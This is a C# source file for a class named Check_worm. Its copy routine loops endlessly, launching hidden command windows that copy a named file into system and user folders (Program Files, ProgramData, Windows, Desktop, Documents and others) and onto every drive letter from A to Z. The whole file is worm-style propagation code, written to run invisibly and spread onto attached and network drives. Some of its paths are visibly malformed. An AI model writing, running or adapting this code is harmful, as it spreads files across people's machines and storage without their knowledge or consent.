using System;
using System.Diagnostics;
using System.IO;


namespace Check
{
    public class Check_worm
    {
        readonly string userName = Environment.UserName;
        public void copy_checkworm(string name)
        {
            
            

            string user_dir = "C:\\Users\\" + userName + "\\";

            int infini = 2;
            while (infini > 1)
            {

                
                if (File.Exists("C:\\Users\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " C:\\Users & close";
                    mtd.Start();
                    mtd.Close();
                }


                if (File.Exists("C:\\ProgramData\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " C:\\ProgramData & close";
                    mtd.Start();
                    mtd.Close();
                }


                if (File.Exists("C:\\Program Files\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " C:\\Program Files & close";
                    mtd.Start();
                    mtd.Close();
                }




                if (File.Exists("C:\\Program Files (x86)\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " C:\\Program Files (x86) & close";
                    mtd.Start();
                    mtd.Close();
                }

                if (File.Exists("C:\\Users\\Default\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " C:\\Users\\Users\\Default & close";
                    mtd.Start();
                    mtd.Close();
                }




                if (File.Exists(user_dir + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " " + user_dir + "& close";
                    mtd.Start();
                    mtd.Close();
                }
                ///
                /////////////////////////////////////////////////////////
                ///

                if (File.Exists(user_dir + "Documents\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " " + user_dir + "Documents\\ & close";
                    mtd.Start();
                    mtd.Close();
                }

                if (File.Exists(user_dir + "Desktop\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " " + user_dir + "Desktop\\ & close";
                    mtd.Start();
                    mtd.Close();
                }

                if (File.Exists(user_dir + "Music\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " " + user_dir + "Music\\ & close";
                    mtd.Start();
                    mtd.Close();
                }




                if (File.Exists(user_dir + "Pictures\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " " + user_dir + "Pictures\\ & close";
                    mtd.Start();
                    mtd.Close();
                }

                if (File.Exists(user_dir + "Downloads\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " " + user_dir + "Downloads\\ & close";
                    mtd.Start();
                    mtd.Close(); ;
                }

                if (File.Exists(user_dir + "Videos\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " " + user_dir + "Videos\\ & close";
                    mtd.Start();
                    mtd.Close();
                }

 

                if (File.Exists("C:\\Windows" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " C:\\Windows & close";
                    mtd.Start();
                    mtd.Close();
                }

                if (File.Exists("A:\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " A:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }


                 if (File.Exists("B:\\" + name))
                 {

                 }
                 else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " B:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }



                if (File.Exists("C:\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " C:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }



                if (File.Exists("D:\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " D:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }




                if (File.Exists("E:\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " E:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                
                if (File.Exists("F:\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " F:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                
                if (File.Exists("G:\\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " G:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                
                if (File.Exists(@"H:\" + name))
                {

                }
                else
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " H:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }


               

                if (File.Exists(@"I:\" + name))                  
                {
                
                }                
                else                  
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " I:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                                    
                if (File.Exists(@"J:\" + name))                 
                {

                }
                else           
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " J:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                                    
                if (File.Exists(@"K:\" + name))                 
                {
                 
                }
                                    
                else                 
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " K:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }


               

                if (File.Exists(@"L:\" + name))                  
                {
                 
                }
                                    
                else               
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " L:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                                    
                if (File.Exists(@"M:\" + name))                  
                {
                   
                }    
                
                else                   
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " M:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                                    
                if (File.Exists(@"N:\" + name))                  
                {
                  
                }
                                    
                else                  
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " N:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                                    
                if (File.Exists(@"O:\" + name))                   
                {
                  
                }
                                    
                else                  
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " O:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }



                if (File.Exists(@"P:\" + name))                   
                {
                  
                }
                                    
                else                   
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " P:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                

 
                if (File.Exists(@"Q:\" + name))                  
                {
                                    
                }
                                    
                else                    
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " Q:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                                    
                if (File.Exists(@"R:\" + name))                   
                {
                  
                }
                                    
                else                 
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " R:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }

                
               
                if (File.Exists(@"S:\" + name))                   
                {
                  
                }
                                    
                else                   
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " S:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                                    
                if (File.Exists(@"T:\" + name))                       
                {
                  
                }
               
                else                 
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " T:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                                    
                if (File.Exists(@"U:\" + name))                      
                {

                }
                                    
                else                  
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " U:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }

                
                if (File.Exists(@"V:\" + name))                     
                {
                  
                }
                                    
                else                   
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " V:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                                    
                if (File.Exists(@"W:\" + name))                 
                {
                                    
                }
                  
                else                  
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " W:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                                    
                if (File.Exists(@"X:\" + name))                  
                {
                                    
                }
                                    
                else                   
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " X:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                

                if (File.Exists(@"Y:\" + name))
                {
                
                }
                                    
                else                
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " Y:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }



                if (File.Exists(@"Z:\" + name))                      
                {
                   
                }
                                    
                else                 
                {
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "cmd.exe";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.StartInfo.Arguments = "/C copy " + name + " Z:\\ & close";
                    mtd.Start();
                    mtd.Close();
                }
                
                infini = infini++;
            }

        
    

        }
    }
}
